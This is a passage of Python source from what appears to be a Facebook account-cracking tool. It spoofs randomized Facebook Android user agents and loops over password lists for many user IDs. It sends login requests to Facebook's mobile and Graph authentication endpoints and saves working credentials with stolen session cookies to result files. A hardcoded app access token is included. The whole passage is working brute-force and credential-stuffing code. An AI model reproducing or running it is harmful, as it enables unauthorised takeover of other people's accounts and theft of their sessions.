        ua1 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/260.0.0.1.146;FBBV/964075729;FBDM/' + '{density=4.0,width=1280,height=2177}' + ';FBLC/it_IT;FBRV/0;FBCR/Vodafone;FBMF/samsung;FBBD/Galaxy A13 5G;FBPN/com.facebook.katana;FBDV/SM-J410G;FBSV/4;FBOP/19;FBCA/arm64-v8a:;]'
        ua2 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 318)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/FB4A;FBAV/253.0.0.4.181;FBBV/123592024;FBDM/' + '{density=2.75,width=1280,height=1444}' + ';FBLC/en_US;FBRV/204159830;FBCR/vodafone IT;FBMF/samsung;FBBD/Galaxy A20s;FBPN/com.facebook.katana;FBDV/SM-A326B;FBSV/9.0;FBOP/19;FBCA/arm64-v8a:;]'
        ua3 = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/331.0.0.1.192;FBBV/750297016;FBDM/' + '{density=3.375,width=720,height=2265}' + ';FBLC/vi_VN;FBRV/210430229;FBCR/Telenor SE;FBMF/samsung;FBBD/Galaxy A Quantum;FBPN/com.facebook.katana;FBDV/SM-J210F;FBSV/7.0.0;FBOP/19;FBCA/arm64-v8a:;]'
        ua4 = '[FBAN/Orca-Android;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/294.0.0.7.179;FBBV/743739304;FBDM/' + '{density=2.3,width=1080,height=1406}' + ';FBLC/es_ES;FBRV/767841939;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
        ua5 = '[FBAN/Orca-Android;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 318)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/FB4A;FBAV/379.0.0.2.111;FBBV/278329258;FBDM/' + '{density=3.4,width=1080,height=1497}' + ';FBLC/id_ID;FBRV/736649101;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
        ua6 = '[FBAN/Orca-Android;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/396.0.0.1.100;FBBV/913722709;FBDM/' + '{density=2.4,width=1080,height=1420}' + ';FBLC/ it_IT;FBRV/449123051;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
        return random.choice([ua1, ua2, ua3, ua4, ua5, ua6])

    def _validate_(self,uid,pasw):
        print(f"\r*--> {str(self.loop)}/{len(self.uid2)} {H}OK{P} : {H}{str(self.oks)}{P} {K}CP{P} : {K}{str(self.cps)}{P}",end="")
        ua = self.____ua____()
        for pwku in pasw:
            try:
                data = {
    'adid': str(uuid.uuid4()),
    'format': 'json',
    'device_id': str(uuid.uuid4()),
    'email': uid,
    'password': pwku,
    'generate_analytics_claim': '1',
    'family_device_id': str(uuid.uuid4()),
    'generate_session_cookies': '1',
    'advertiser_id': str(uuid.uuid4()),
    'source': 'login',
    'method': 'auth.login',
    'locale': 'id_ID',
    'client_country_code': 'ID',
    'fb_api_req_friendly_name': 'authenticate',
    'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
    'api_key': '256002347743983',
    'access_token': '256002347743983|374e60f8b9bb6b8cbb30f78030438895',
}
                head = {'host': 'b-graph.facebook.com',
'x-fb-connection-quality': 'EXCELLENT',
'x-fb-sim-hni': '51001',
'x-fb-net-hni': '51001',
'user-agent': ua,
'content-type': 'application/x-www-form-urlencoded',
'x-fb-connection-type': 'MOBILE.LTE',
'accept-encoding': 'gzip, deflate',}
                response = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, allow_redirects=False,verify=True).json()
                if "session_key" in response:
                    self.oks+=1
                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    print(f"\r\033[1;32m[✓] {uid}|{pwku}|{coki}      ")
                    open("RESULT/OK.txt","a").write(f"{uid}|{pwku}|{coki}\n")
                    break
                elif 'User must verify their account' in response['error']['message']:
                    self.cps+=1
                    print(f"\r\033[1;31m[!] {uid}|{pwku}      ")
                    open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                sleep(15)
        self.loop+=1


    def _regular_(self,uid,pasw):
        sys.stdout.write(f"\r*--> {str(self.loop)}/{len(self.uid2)} {H}OK{P} : {H}{str(self.oks)}{P} {K}CP{P} : {K}{str(self.cps)}{P}"),
        sys.stdout.flush()
        ses = requests.Session()
        ua = random.choice(ugen)
        for pwku in pasw:
            try:
                link = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr")
                dat = {
    'lsd': re.search('name=\"lsd\" value=\"(.*?)\"', str(link.text)).group(1),
    'jazoest': re.search('name=\"jazoest\" value=\"(.*?)\"', str(link.text)).group(1),
    'uid': uid,
    'next': 'https://mbasic.facebook.com/login/save-device/',
    'flow': 'login_no_pin',
    'pass': pwku,
}
                hd = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                ses.post(f"https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=dat,headers=hd,allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    self.oks+=1
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    uid = re.findall('c_user=(.*);xs',coki)[0]
                    print(f'\r\033[1;32m[✓] {uid}|{pwku}|{coki}')
                    open("RESULT/OK.txt","a").write(f"{uid}|{pwku}|{coki}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    self.cps+=1
                    uid = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                    print(f'\r\033[1;31m[!] {uid}|{pwku}')
                    open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                sleep(15)
        self.loop+=1